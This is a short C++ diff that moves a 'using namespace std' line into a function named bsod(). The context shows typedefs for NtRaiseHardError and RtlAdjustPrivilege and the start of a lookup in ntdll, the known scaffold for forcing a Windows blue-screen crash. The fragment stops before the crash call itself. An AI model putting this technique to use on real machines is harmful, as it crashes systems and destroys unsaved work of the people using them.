@@ -6,11 +6,11 @@
 #include <iostream>
 #include <Windows.h>
 #include <winternl.h>
-using namespace std;
 typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 void bsod()
 {
+    using namespace std;
     BOOLEAN bEnabled;
     ULONG uResp;
     LPVOID lpFuncAddress = (LPVOID)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
